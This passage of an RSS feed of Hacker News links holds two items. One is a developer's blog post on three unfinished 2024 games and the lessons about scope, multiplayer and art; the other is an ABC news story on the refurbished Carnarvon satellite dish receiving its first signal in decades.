-<![CDATA[What I Learned Failing to Finish a Game in 2024]]>
-            </title>
-            <description>
-<![CDATA[
-Score 98 | Comments 65 (<a href="https://news.ycombinator.com/item?id=42681545">thread link</a>) | @grgaln
-<br/>
-January 13, 2025 | https://georgeallen.dev/posts/2024-failures-in-game-development/ | <a href="https://web.archive.org/web/*/https://georgeallen.dev/posts/2024-failures-in-game-development/">archive.org</a>
-<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="dream-single-post-content" itemprop="articleBody">
-        
-        <img src="https://georgeallen.dev/img/game_three.gif" alt="What I Learned Failing to Finish a Game in 2024">
-        
-
-        <p>Here’s a breakdown of my year in game dev, the challenges I faced, and the key takeaways that’ll shape my 2025 projects.</p>
-<h2 id="tldr">TL;DR</h2>
-<p>In 2024, I didn’t finish any games, but I learned a lot about game development. I tackled three projects: a multiplayer turn-based RPG (Kinship), a puzzle simulation game (ClarityCorp), and a co-op side-scroller shooter (no name yet). The biggest challenges included managing scope, learning multiplayer mechanics, and handling art requirements.</p>
-<p><em>Key lessons: start small, focus on a solid game loop, and polish later. Despite not finishing a game, I made great strides in development and am ready to continue working in 2025.</em></p>
-<hr>
-<p>2024 didn’t go as planned. Despite the title suggesting I “failed,” I actually learned a tremendous amount about game development last year. Looking back, I see a lot of unfinished projects, but with each one, I gained valuable lessons.</p>
-<h2 id="game-one---isometric-turn-based-multiplayer-rpg-kinship">Game one - Isometric Turn-Based Multiplayer RPG (Kinship)</h2>
-<p>At the start of the year, my focus was on multiplayer—specifically, “how the hell do you make a multiplayer game?”</p>
-<p>After diving into articles (shout out <a href="https://gafferongames.com/" target="_blank">Glenn Fielder</a>
-) and studying the multiplayer quirks, I settled on a turn-based combat RPG. Games like Baldurs Gate 3 and the Divinity series are absolute classics that I would find huge inspiration from.</p>
-<p>Kinship was designed as a 4-player, online co-op RPG. Players could choose from the classic classes—Fighter, Mage, Rogue, or Cleric—and battle through an isometric world. The combat system was simple, with basic attacks and spells, and the enemies (mostly slimes, for now) moved and attacked in turns.</p>
-<p>Below is a screenshot of the in game combat, art is placeholder, and not final.</p>
-<figure><img src="https://georgeallen.dev/img/kinship-screen.png" width="100%">
-</figure>
-
-<p>That’s pretty much it. Despite the lack of content, this took me many months to achieve. So, where did I go wrong?</p>
-<h3 id="overambitious-scope">Overambitious Scope</h3>
-<p>The classic advice is to start small, and I definitely ignored that here. Multiplayer games are complex, and Kinship needed a lot of content—multiple playable classes, levels, and assets. The sheer scope started to overwhelm me, and I found myself stuck in a cycle of not knowing where to begin.</p>
-<h4 id="isometric-art">Isometric Art</h4>
-<p>Isometric is hard. Well, not really, there are some key concepts that make it easier, but in general it means you need at least 4 versions of each asset, for each direction in the game. This means not only are you making one walk cycle, you are making 4, for each playable character, each enemy and certain moveable objects. Now your characters need to attack, thats 4 attack animations. They also have many attacks… You get the point. It’s a lot of art.</p>
-<p>If you are anything like me (a programmer), making art is the most painful part of game development. So having to make 4 versions of everything in a perspective which is very easy to spot mistakes, I could not achieve this feat alone.</p>
-<p>Perhaps I should have linked up with an actual artist, but without being able to pay them a fair salary, this was not an option I could pursue.</p>
-<h4 id="playable-classes">Playable classes</h4>
-<p>For this style of game to be fun and re-playable, it needed at least 4 classes, one for each player. This really multiplies out how much work you need to do to finish the game. Not only does each class need its own assets, it also needs its own behaviors, attacks, skill trees and balancing, all things required to make a really good game. Resulting in another key point that de-motivated me and stopped me making progress.</p>
-<p>I definitely took on too much too soon, and should have focussed on nailing one class from top to bottom and ironed out all the kinks along the way.</p>
-<p>The advice of “start small” really started to ring true here!</p>
-<h3 id="learning-new-concepts-takes-time">Learning new concepts takes time</h3>
-<p>The elephant in the room is “multiplayer”. At the start of the year I had never made a multiplayer game, I do however have extensive experience in networking having been a Backend Software engineer for over 9 years, a degree in Computer Science and founding a networking based tech company.</p>
-<p>Lot’s of people give advice against solo-dev’s targeting multiplayer games. Whilst I do believe that advice is valid, I also believed that multiplayer is a key concept of some of the best games I play and is a way to stand out amongst the swarm of titles that hit Steam everyday. I’m also a big believer in making games that you want to play. It helps in so many ways to keep you motivated as development is fun.</p>
-<p>Learning the quirks of multiplayer took time, however. It was apparent early on in my research that targeting a turn based system would make multiplayer slightly easier, as you do not have to deal with too many synchronization issues and lag compensation. You “just” need to make sure each action in your game is deterministic and can be replayed across clients, so they can each replicate the turns taken and synchronize state at the end of each players turn.</p>
-<p>Ultimately the multiplayer parts of Kinship weren’t too hard to implement. Steam have an excellent library and really abstracted away some of the hard parts of the networking. The issue’s stemmed from the fact that testing multilayer games is quite a lot harder and forces a slower feedback loop. You can’t just load your game and start playing, expecting it to “just work” when you add more players. Testing meant I needed to be constantly running multiple copies of my game, sometimes across multiple devices, ensuring that interactions were smooth and there were no networking bugs. This is just harder, bugs are harder to spot, diagnose and fix.</p>
-<h3 id="polishing-too-early">Polishing too early</h3>
-<p>I really wanted to leverage the isometric 2.5d style to have some amazing lighting and shadow casting. In hindsight I should have spent less time on this early in development. I’m super stoked with the effect I managed to achieve, however it took many hours of bashing my head against a wall in shader hell.</p>
-<p>Potentially this is the sort of feature that I should really focus on during the polish phase of development, once I have a game, with content and features, I can focus on making it really look and feel like a finished product.</p>
-<p>You can see below an example screenshot of how the light and shadow casting work. I took huge inspiration from the approach that the Graveyard Keeper team used, which they outlined <a href="https://www.gamedeveloper.com/programming/graveyard-keeper-how-the-graphics-effects-are-made" target="_blank">here</a>
-. The main idea is that you simulate 3d lighting based on the vertical axis, the article really explains it better than I can!</p>
-<figure><img src="https://georgeallen.dev/img/kinship-shadows.png" width="50%">
-</figure>
-
-<p>I did really learn the nuts and bolts of how to use shaders, and this is something I can carry forward into other games that I pursue.</p>
-<h2 id="game-two---puzzle-simulation-game-claritycorp">Game two - Puzzle simulation game (ClarityCorp)</h2>
-<p>My next game was completely different, I mean completely. Using my learnings from Kinship, I dropped multiplayer and tried to massively drop the art requirements.</p>
-<p>The core concept was a single player experience where you are a remote worker for ClarityCorp. You log into your PC each day, are given a variety of seemingly pointless tasks, which over time you start to learn your company has a very menacing underbody. Think Papers, Please, with some heavy Matrix and Severance style inspiration.</p>
-<h3 id="no-hook">No hook</h3>
-<p>This game however, really didn’t get further than the concept stages for me. I really struggled to nail down how to make it fun, and have a great hook.</p>
-<p>The screenshot below shows the “login” screen you are presented with each day. You would login and be presented with a series of tasks you needed to complete for the day, to earn money and keep your family alive.</p>
-<figure><img src="https://georgeallen.dev/img/clarity-corp.png" width="100%">
-</figure>
-
-<p>One of the tasks I started playing with, heavily inspired by Severance’s data refinement was called “Scrubbing”. You are presented with a series of words, and some criteria for words you needed to “scrub” out. You would have a time limit to remove all the words, each level getting harder and harder, and the criteria changing each time.</p>
-<figure><img src="https://georgeallen.dev/img/clarity-corp-scrubbing.gif" width="100%">
-</figure>
-
-<p>Despite having ideas for more mini-games, puzzles and how to progress the story, I got very demotivated as I felt this game really relied on a solid loop, which I could not nail down.</p>
-<p>I think there is potential here for a great game, but it didn’t keep me hooked during development, so chose to park it for now. My main learning here, you need to start development with more solid ideas ahead of time. Really lock in a core game loop on paper and make that reality. Having a random list of “cool” puzzles and not knowing how to tie them together isn’t really a game.</p>
-
-<p>My third and final foray into game development of the year, took me to another multiplayer game. I haven’t yet come up with a name, however I do have the core concepts locked down.</p>
-<p>This game involves up to 4 players, working through side scrolling levels, defeating enemies as they go. My key inspirations are:</p>
-<ol>
-<li>Celeste for the level design + platforming mechanics</li>
-<li>Broforce for the combat/carnage</li>
-<li>Remnant: From the Ashes, for the souls-like twist</li>
-</ol>
-<p>Despite not being implemented the idea is that each player has the same starting point on a skill/level tree and they can take diverging paths to improve their abilities. Whether thats how fast they move, how far they jump, how often they shoot/attack, damage, health, skills etc. The players will be able to pick up different weapons, use differing skills and gain new abilities as they progress through a number of levels, ending with boss fights.</p>
-<p>This game is hopefully a combination of the learnings from the last two games i discussed in this post. Whilst it is still multiplayer, it has a massively simplified art style, less diverse playable classes and hopefully simpler levels to design.</p>
-<p>There are still some challenges that have and haven’t presented themselves.</p>
-<p>Below you can see an early build of the game, featuring one player and an enemy. Again, placeholder art!</p>
-<figure><img src="https://georgeallen.dev/img/game_three.gif" width="100%">
-</figure>
-
-<h3 id="realtime-multiplayer">Realtime multiplayer</h3>
-<p>One key difference with this game is that the multiplayer is now realtime. Which brings up a few key new concepts I needed to learn about and solve. These are Client-side prediction and Lag compensation. Thankfully I had already learnt a lot about multiplayer game design so it was much easier to look at these to concepts in isolation and how I could solve them.</p>
-<p>Again leaning on the amazing Glenn Fielder and other online resources it was not too hard to get an early proof of concept up and running, where multiple people can join a game and progress through a level. I can simulate lag and packet loss to test my implementations against them. I then came up with some patterns I can apply throughout the development of the game to ensure that new features do not suffer issues. We will see how well these stand.</p>
-<h3 id="level-assets">Level assets</h3>
-<p>This time I don’t need 4 versions of each animation in a isometric perspective, but I do need a lot of tilesets for the levels I want to make. I also need to make these levels.</p>
-<p>I feel this is much more achievable scope for me as a solo-dev, I can commission harder pieces of art out to an actual artist if need be and it will stay within budget.</p>
-<p>For the levels themselves, I have also thought about procedurally generating certain levels to simplify the level creation process (although this does have its complexities and downsides).</p>
-<h3 id="boss-fights">Boss fights</h3>
-<p>Bosses in video games are notoriously hard to make, its hard to design them in a way that is both hard and fun. As well as this, you need to ensure that your bosses look and feel great, with complex behavior patterns and limited RNG.</p>
-<p>This is something I do not have any experience with, so will 100% be a challenge, but one that I am willing to take on in 2025.</p>
-<h3 id="play-testing">Play testing</h3>
-<p>Accurately testing multiplayer game experiences, well, really needs multiple people. I haven’t gotten far enough into development to make this a real problem yet, but it will approach soon. I will need a solid group of people I can keep playing with to iron out issues and properly balance the game. This is where being a solo-dev will really hinder my progress and puts doubts on my motivation. Something I need to consider going forward is how will I actually execute on this. Perhaps it is time to start building out a team…</p>
-<h2 id="key-takeaways-from-2024">Key Takeaways from 2024</h2>
-<p>While I didn’t finish any games in 2024, I gained invaluable experience. Here’s what I’ve learned:</p>
-<ol>
-<li><strong>Multiplayer development is tough:</strong> But it’s worth learning, especially if you want to make games that stand out.</li>
-<li><strong>Start small:</strong> Don’t dive into massive projects right away. Focus on getting something small and fun off the ground first.</li>
-<li><strong>Know your limits:</strong> The art requirements for certain projects can overwhelm you, so think about how you’ll manage them.</li>
-<li><strong>Solid game loops are crucial:</strong> Without a core loop that’s fun and engaging, your game can lose momentum quickly.</li>
-<li><strong>Polish comes later:</strong> Focus on gameplay first, and leave polish and visual effects for when the core mechanics are solid.</li>
-</ol>
-<h2 id="looking-ahead-to-2025">Looking ahead to 2025</h2>
-<p>Even though I didn’t complete a game in 2024, I’ve made significant strides as a developer. I’m excited to continue working on “Game Three” and apply everything I’ve learned. If it doesn’t work out, that’s okay. Game development is a creative outlet, not my full-time job. But I’ll keep coming back to it because I love the challenge and putting things out for people to play!</p>
-      </section></div>]]>
-            </description>
-            <link>https://georgeallen.dev/posts/2024-failures-in-game-development/</link>
-            <guid isPermaLink="false">hacker-news-small-sites-42681545</guid>
-            <pubDate>Mon, 13 Jan 2025 09:16:17 GMT</pubDate>
-        </item>
-        <item>
-            <title>
-<![CDATA[Carnarvon's NASA satellite dish receives first signal in almost 40 years]]>
-            </title>
-            <description>
-<![CDATA[
-Score 126 | Comments 25 (<a href="https://news.ycombinator.com/item?id=42679998">thread link</a>) | @zdw
-<br/>
-January 12, 2025 | https://www.abc.net.au/news/2024-12-03/carnarvon-nasa-dish-receives-signal-repairs/104672866 | <a href="https://web.archive.org/web/*/https://www.abc.net.au/news/2024-12-03/carnarvon-nasa-dish-receives-signal-repairs/104672866">archive.org</a>
-<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The jagged peaks and valleys of a line chart might not look like much, but they represent a comeback years in the making.&nbsp;</p><p>Carnarvon's historic Overseas Telecommunication Commission (OTC) dish had sat dormant for almost four decades.</p><p>The structure, nearly 900 kilometres north of Perth<strong>, </strong>was decommissioned after a decorated history that included aiding <a href="https://www.abc.net.au/news/2024-07-03/carnarvon-celebrates-60-years-nasa-remote-tracking-station-wa/104042582" data-component="ContentLink" data-uri="coremedia://article/104042582">NASA lunar missions</a>.</p><figure data-print="inline-media" data-component="Figure" id="104675466" data-uri="coremedia://imageproxy/104675466"><div><div><div><p><img alt="A bumpy line chart on a digital screen." sizes="100vw" src="https://live-production.wcms.abc-cdn.net.au/969697c813fe43ecd8a063e9264222a6?impolicy=wcms_crop_resize&amp;cropH=1333&amp;cropW=2000&amp;xPos=0&amp;yPos=86&amp;width=862&amp;height=575" loading="lazy" data-component="Image" data-lazy="true"></p></div></div></div><figcaption><p data-component="Typography">The waves of the dataset show how precisely the OTC dish was aligned with the satellite.<!-- --> <cite>(<span>Supplied: ThothX</span>)</cite></p></figcaption></figure><p>It was <a href="https://www.abc.net.au/news/2020-08-25/dish-that-played-a-part-in-moon-landings-may-be-demolished/12590350" data-component="ContentLink" data-uri="coremedia://article/12590350">destined for demolition</a> before Canadian aerospace company ThothX signed a 20-year lease for the facility in 2022, with <a href="https://www.abc.net.au/news/2023-09-26/repairs-begin-carnarvon-historic-otc-dish-nasa-missions/102893882" data-component="ContentLink" data-uri="coremedia://article/102893882">minor repairs beginning last year</a>.</p><p>This week, the 29-metre-wide parabolic antenna received its first radar signal since 1987.</p><p>"I flew 18,000 kilometres from Canada to conduct this test and so, you can imagine, I was delighted when we managed to receive the first signals from [the satellite]," ThothX chief executive Brendan Quine said.</p><p>"This gives us a proof-of-concept for the project, and allows us to move forward to the next step, which is to finish the refurbishment."</p><h2 data-component="Heading">Like a giant caravan</h2><p>The dish needed to be aimed precisely at a satellite of interest in order to receive the signal.</p><figure data-print="inline-media" data-component="Figure" id="104673290" data-uri="coremedia://imageproxy/104673290"><div><div><div><p><img alt="A cleaner in a face mask vacuums the inside of a narrow tunnel." sizes="100vw" src="https://live-production.wcms.abc-cdn.net.au/c719f81c5a66cc93e053150d53f30b59?impolicy=wcms_crop_resize&amp;cropH=372&amp;cropW=558&amp;xPos=0&amp;yPos=262&amp;width=862&amp;height=575" loading="lazy" data-component="Image" data-lazy="true"></p></div></div></div><figcaption><p data-component="Typography">Mr Quine climbed inside the central optics of the dish to clean them.&nbsp;<!-- --> <cite>(<span>Supplied: ThothX</span>)</cite></p></figcaption></figure><p>However, it had only been rotated a handful of times since the late 1980s and rarely beyond the range of motion needed to be stowed for the cyclone season.</p><p>Along with a new back-end radio system, the dish's bearings required flushing with fresh oil and decades-worth of pigeon droppings removed, the latter of which was an ongoing battle.&nbsp;</p><p>The antenna's optics, a six-metre-deep tube at its centre, were also cleaned by hand.</p><p>Despite the comprehensive works and lofty goal, the latest test came down to three men and a hand-operated drill fitted to the rotator mechanism.</p><figure data-print="inline-media" data-component="Figure" id="104675468" data-uri="coremedia://imageproxy/104675468"><div><div><div><p><img alt="An older man with a beard holds a battery-powered drill to a machine." sizes="100vw" src="https://live-production.wcms.abc-cdn.net.au/0307ca5910611a78c02faba821c69532?impolicy=wcms_crop_resize&amp;cropH=3061&amp;cropW=4592&amp;xPos=0&amp;yPos=271&amp;width=862&amp;height=575" loading="lazy" data-component="Image" data-lazy="true"></p></div></div></div><figcaption><p data-component="Typography">The 300-tonne dish was manually rotated with a power tool by Denham Dunstall.<!-- --> <cite>(<span>ABC Pilbara: Alistair Bates</span>)</cite></p></figcaption></figure><p>ThothX Australia director Phil Youd compared the manual operation to fine-tuning the dish atop a caravan.</p><p>"Some have got their satellite dishes ... it's the same principle as that to find a satellite except it's far more accurate with what we've got," he said.</p><p>"It is a pinpoint that we are looking for; whereas in a caravan, they're looking for a broad beam coming down from the satellite, we are looking at one little frequency."</p><figure data-print="inline-media" data-component="Figure" id="104675510" data-uri="coremedia://imageproxy/104675510"><div><div><div><p><img alt="Two men look at a small screen." sizes="100vw" src="https://live-production.wcms.abc-cdn.net.au/20f35b736734180a0e4b950ca2429ab1?impolicy=wcms_crop_resize&amp;cropH=3061&amp;cropW=4592&amp;xPos=0&amp;yPos=193&amp;width=862&amp;height=575" loading="lazy" data-component="Image" data-lazy="true"></p></div></div></div><figcaption><p data-component="Typography">Mr Quine and Mr Youd shouted out directions according to the data as the dish was rotated.<!-- --> <cite>(<span>ABC Pilbara: Alistair Bates</span>)</cite></p></figcaption></figure><p>After several minute adjustments, the OTC dish managed to lock on the position of geo-stationary object NSS-12.</p><p>The United States-built satellite provides a wide range of services to Australia, such as television broadcasting, online banking transactions, emergency beacons, and military communications.</p><h2 data-component="Heading">'Adversaries' above</h2><p>With its proof-of-concept secured, ThothX plans to invest upwards of $10 million into the OTC dish, which it says will take a key place in its global satellite tracking network.</p><p>The dish's location in remote Western Australia, discovered by Mr Quine while searching Google Earth, is particularly well-positioned to give potential military clients a strategic advantage.</p><figure data-print="inline-media" data-component="Figure" id="104675488" data-uri="coremedia://imageproxy/104675488"><div><div><div><p><img alt="A middle aged man looks at the camera from in front of a huge satellite dish." sizes="100vw" src="https://live-production.wcms.abc-cdn.net.au/00c01e6895a58b4c28290a502563262b?impolicy=wcms_crop_resize&amp;cropH=3061&amp;cropW=4592&amp;xPos=0&amp;yPos=387&amp;width=862&amp;height=575" loading="lazy" data-component="Image" data-lazy="true"></p></div></div></div><figcaption><p data-component="Typography">Brendan Quine travelled from Canada for the test.<!-- --> <cite>(<span>ABC Pilbara: Alistair Bates</span>)</cite></p></figcaption></figure><p>"Our adversaries are very active in space," he said.</p><p>"Carnarvon is in a perfect location to monitor these activities because we can monitor the whole Pacific theatre."</p><p>He said an active radar would surpass the usefulness of telescopes used to monitor satellites, which could be affected by the weather.</p><p>"If you're waiting for your adversary to move a spacecraft, you kind of want to know immediately what's going on, and you want to be able to protect your own assets from things crashing into it," he said.</p><h2 data-component="Heading">More work to be done</h2><p>The state government contributed $50,000 towards the OTC dish's refurbishment in September as part of a regional development grant.</p><p>ThothX said those funds would go towards repainting the antenna and installing new power systems.</p><p>A fresh outer coating to help the dish withstand Carnarvon's corrosive ocean winds is next on the agenda, with hopes for a full radar demonstration in the next year.</p><figure data-print="inline-media" data-component="Figure" id="104675514" data-uri="coremedia://imageproxy/104675514"><div><div><div><p><img alt="dish close" sizes="100vw" src="https://live-production.wcms.abc-cdn.net.au/a8df22c49eabbef2d287603b6334108e?impolicy=wcms_crop_resize&amp;cropH=3061&amp;cropW=4592&amp;xPos=0&amp;yPos=193&amp;width=862&amp;height=575" loading="lazy" data-component="Image" data-lazy="true"></p></div></div></div><figcaption><p data-component="Typography">A new paint job is in store for the OTC dish, but it might be years before it's fully operational.<!-- --> <cite>(<span>ABC Pilbara: Alistair Bates</span>)</cite></p></figcaption></figure><p>Ultimately, the company expects to install more equipment and software that will allow the OTC dish to locate spacecraft up to 50,000 kilometres from Earth at an approximate three-metre margin of error.</p><p>The space company compared the project to its refurbishment of the 46-metre-dish at Algonquin Radio Observatory in Canada, one of several it operates across North America, Europe, and Australia.</p><p>It took about 15 years for the Algonquin dish to become fully operational.</p><p>Mr Youd, who also manages the Carnarvon Space and Technology Museum, said he was glad to help restore the local landmark.</p><p>"It's almost giving it a rebirth, you know?"</p></div></div>]]>
-            </description>
-            <link>https://www.abc.net.au/news/2024-12-03/carnarvon-nasa-dish-receives-signal-repairs/104672866</link>
-            <guid isPermaLink="false">hacker-news-small-sites-42679998</guid>
-            <pubDate>Mon, 13 Jan 2025 04:09:24 GMT</pubDate>
         </item>
     </channel>
 </rss>
